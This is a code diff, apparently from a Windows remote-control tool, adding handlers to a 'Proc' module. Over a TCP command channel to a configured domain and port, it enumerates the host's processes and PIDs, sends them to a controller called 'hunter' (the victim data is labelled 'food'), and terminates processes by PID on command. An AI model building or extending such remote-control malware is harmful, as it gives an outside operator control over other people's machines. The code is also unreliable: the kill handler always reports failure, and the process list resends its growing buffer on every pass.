@@ -9,13 +9,12 @@ Proc::Proc() {
 	CmdFreshProcs = "FRESH_PROCS";
 	CmdDeleteProc = "DELETE_PROC";
 	// 食物发送至hunter
-	CmdSendProcs = "SEND_PROCS";
+	CmdSendProc = "SEND_PROC";
 	CmdKillProcSuccess = "KILL_SUCCESS";
 	CmdKillProcFailed = "KILL_FAILED";
 	// 分割与结束符
 	CmdSplit = ";";
 	CmdEnd = "\r\n";
-	CmdFileSplit = "|";
 }
 
 void Proc::startByNewThread(std::string domain, int port)
@@ -72,7 +71,7 @@ void Proc::startProc(std::string domain, int port)
 		addDataToBuffer(&sock, buf, szData, ret);
 	}
 
-	OutputDebugStringA("Finished file\r\n");
+	OutputDebugStringA("Finished Proc\r\n");
 }
 
 
@@ -133,8 +132,56 @@ void Proc::processCmd(TcpSocket* sock, std::string& cmd, std::string& data)
 
 void Proc::doFreshProcs(TcpSocket* sock, std::map<std::string, std::string>& args) {
 
+	std::string data; // 返回数据
+
+	// 创建ctoolhelp对象来遍历进程快照
+	CToolhelp thProcesses(TH32CS_SNAPPROCESS);
+	PROCESSENTRY32 pe = { sizeof(pe) };
+	BOOL fOk = thProcesses.ProcessFirst(&pe);
+	for (; fOk; fOk = thProcesses.ProcessNext(&pe)) {
+		// 把进程名称(不带路径)还有PID放进去
+		// 先找exe名称 tcsrchr是查找字符串中某字符最后出现的位置
+		PCTSTR pszExeFile = _tcsrchr(pe.szExeFile, TEXT('\\'));
+		if (pszExeFile == NULL) {
+			pszExeFile = pe.szExeFile;
+		}
+		else {
+			pszExeFile++; // 跳过slash
+		}
+
+		CHAR szPid[8];
+		_itoa_s((int)pe.th32ProcessID, szPid, sizeof(szPid), 10);
+		// 拼接返回信息
+		data.append(gProc.CmdSendProc + gProc.CmdSplit);
+		data.append("EXENAME" + gProc.CmdSplit);
+		data.append(pszExeFile + gProc.CmdSplit);
+		data.append("PID" + gProc.CmdSplit);
+		data.append(szPid + gProc.CmdEnd);
+		// 发送
+		sock->sendData(data.data(), data.size());
+	}
 }
 
 void Proc::doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args) {
 
+	std::string data; // 返回信息
+	DWORD dwPid = atoi(args["PID"].data()); // 获取pid
+	HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);
+
+	do
+	{
+		if (hProc == NULL) {
+			OutputDebugStringA("open process failed\r\n");
+			break;
+		}
+		if (TerminateProcess(hProc, 0) == 0) {
+			OutputDebugStringA("terminate process failed\r\n");
+			break;
+		}
+		OutputDebugStringA("kill process successfully\r\n");
+	} while (false);
+
+	data.append(gProc.CmdKillProcFailed + gProc.CmdEnd);
+	// 发送
+	sock->sendData(data.data(), data.size());
 }
